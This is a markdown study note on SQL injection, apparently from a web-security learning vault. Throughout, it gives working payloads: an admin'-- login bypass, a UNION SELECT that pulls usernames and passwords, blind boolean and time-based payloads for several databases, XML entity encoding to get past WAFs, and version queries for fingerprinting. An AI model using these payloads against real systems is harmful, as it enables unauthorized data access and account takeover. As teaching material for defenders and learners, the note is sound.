## 📌 What is SQL Injection?

SQLi is a vulnerability where user input is unsafely embedded into database queries, allowing attackers to manipulate or control those queries.

> manipulate or control those queries.

### 🔓 What attackers can do with SQLi:

- View unauthorized data (passwords, credit card info)
- Bypass login
- Modify or delete records
- Access other database tables
- Execute OS commands (in advanced cases)   
- Persistently backdoor the server    
- Perform denial of service (DoS)


## 🔍 How to Detect SQLi

-  Start with ' (Single quote), If it gives error, It is vulnerable to sql injection.
-  Try to   `OR 1=1--`   to get extra info or to bypass login.
-   Use `' UNION SELECT NULL--`  to determine the number of the column.
-   Use `<xml>&#x53;ELECT ...</xml>` when you find xml query.

--- 

## 🧪 Real Examples

### 🔹 1. Retrieving Hidden Data (Classic SQLi)

#### 🧾 Normal query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

#### 🧨 Injected URL:
`https://site.com/products?category=Gifts'--`

#### 🧨 Resulting SQL:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

--- 

### 🔹2. OR-Based Authentication Bypass

#### 🧾 Normal login query:
`SELECT * FROM users WHERE username = 'user' AND password = 'pass'`

#### 🧨 Injected input:
`Username: admin'-- Password: (blank)`

#### 🧨 Resulting SQL:
`SELECT * FROM users WHERE username = 'admin'--' AND password = ''`

✅ _Logs you in as admin without password._

--- 
### 🔹 3. [[UNION]] Injection - Extract Other Tables  

#### 🧾 Normal:
`SELECT name, description FROM products WHERE category = 'Gifts'`

#### 🧨 Injected:
`' UNION SELECT username, password FROM users--`

#### 🧨 Final query:
`SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'`

✅ _Shows usernames and passwords in product listings._

---

### 🔹 4. Blind SQL Injection (No visible output)

Use when app doesn’t show SQL errors.

#### 🧪 Boolean logic:
`' AND 1=1--   ✅ true ' AND 1=2--   ❌ false`

Compare responses. If page differs, the query is injectable.

#### ⏱ Time-based (for totally blind SQLi):
`' OR SLEEP(5)--         (MySQL) ' OR pg_sleep(5)--      (PostgreSQL) ' OR WAITFOR DELAY '0:0:5'--   (MSSQL)`

✅ _Server delay = injection successful._

---

### 🔹 5. Second-Order SQLi

- Injection occurs during **data retrieval**, not input.
- Example:
    - Attacker sets name to: `foo'--`
    - Later, that name is used in a vulnerable query:
        `SELECT * FROM users WHERE name = 'foo'--'`

---

### 🔹 6. SQLi via [[XML]] Input  

**Bypasses WAFs via encoding:**

`<stockCheck>
	`<productId> 1 </productId>
	`<storeId> 999 &#x53;ELECT * FROM users </storeId> 
`</stockCheck>`

✅ _S = S, server decodes and injects `SELECT`_


## 🔎 Identify DB Type:


`SELECT @@version`                          -- MySQL 
`SELECT version()`                          -- PostgreSQL 
`SELECT * FROM v$version`           -- Oracle 
`SELECT @@VERSION`                          -- MSSQL